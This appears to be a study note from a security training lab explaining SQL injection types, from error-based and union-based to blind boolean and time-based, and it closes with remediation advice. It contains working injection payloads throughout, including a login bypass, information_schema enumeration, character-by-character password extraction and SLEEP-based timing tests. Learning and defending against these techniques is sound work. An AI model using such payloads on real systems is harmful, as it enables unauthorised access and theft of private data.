SQL (Structured Query Language) Injection, mostly referred to as **SQLi**, is an attack on a web application database server that causes malicious queries to be executed.

When a web application communicates with a database using input from a user that hasn't been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web application authentication methods to private or customer areas. This is why SQLi is one of the *oldest web application vulnerabilities, and it can also be the most damaging.*

Refer [Database](/note/Database), [SQL](/note/SQL)

*Example:*
*Take the following scenario where you've come across an online blog, and each blog entry has a unique ID number. The URL for each blog entry may look something like this:*

`https://website.thm/blog?id=1`

*The web application may use an SQL statement that looks something like the following:*

```sql
SELECT * from blog where id=1 and private=0 LIMIT 1;
```

*Let's pretend article ID 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:*

`https://website.thm/blog?id=2;--`

*Which would then, in turn, produce the SQL statement:*

```sql
SELECT * from blog where id=2;-- and private=0 LIMIT 1;
```

*The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. This will return the article with an ID of 2 whether it is set to public or not.*

# In-Band SQL Injection
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

# Error-Based SQL Injection
This type of SQL Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 

The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( `'` ) or a quotation mark (`"` ).

`https://website.thm/article?id=0+union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema='sqli_one'`

The method `group_concat()` gets the specified column (in our case, `table_name`) from multiple returned rows and puts it into one string separated by commas. The next thing is the `information_schema` database; **every user of the database has access to this**, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users.

`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`

# Union-Based SQL Injection
This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

## Blind SQLi
Blind SQLi is when we get **little to no feedback** to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successfully enumerate a whole database.

### Authentication Bypass
One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login.

```sql
select * from users where username='' and password='' LIMIT 1;
-- input 
-- ' OR 1=1;-- 
-- so that command becomes
select * from users where username='' OR 1=1;--' and password='' LIMIT 1;
```

## Boolean Based

Boolean-based SQL Injection refers to the response we receive from our injection attempts, which could be a **true/false**, **yes/no**, **on/off**, **1/0** or any response that can only have two outcomes. That outcome confirms that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, with just these two responses, it's possible to enumerate a whole database structure and contents.

1. Find number of columns
    ```sql
    -- append
    ' UNION SELECT 1,2;--
    -- to do enumeration
    ```
2. Discover databse name
    Using the built-in `database()` method and then using the like operator to try and find results that will return a true status.
    ```sql
    select * from users where username = 'admin123' UNION SELECT 1,2,3 where database() like '%';--
    -- cycle through all the letters, numbers and characters such as - and _ until we discover a match
    ```
3. Enumerate Table names
    ```sql
    select * from users where username = 'admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
    ```
4. Enumerate Column names
    ```sql
    select * from users where username = 'admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
    -- once you've found the column named id,
    select * from users where username = 'admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
    ```
5. Find the data
    ```sql
    select * from users where username = 'admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';--
    ```
    
## Time-Based

A time-based blind SQL injection is very similar to the above boolean-based one in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced using built-in methods such as `SLEEP(x)`alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

```sql
-- This payload should have produced a 5-second delay,
-- confirming the successful execution of the UNION statement and that there are two columns.
select * from analytics_referrers where domain='admin123' UNION SELECT SLEEP(5),2;--
```

## Remediation

As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the advice below:

### Prepared Statements (With Parameterized Queries):

In a prepared query, the first thing a developer writes is the SQL query, and then any user inputs are added as parameters afterwards. Writing prepared statements ensures the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look much cleaner and easier to read.

## Input Validation:
Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 

## Escaping User Input:
Allowing user input containing characters such as `' " $ \` can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.

### References
- https://sqlwiki.netspi.com/attackQueries/dataTargeting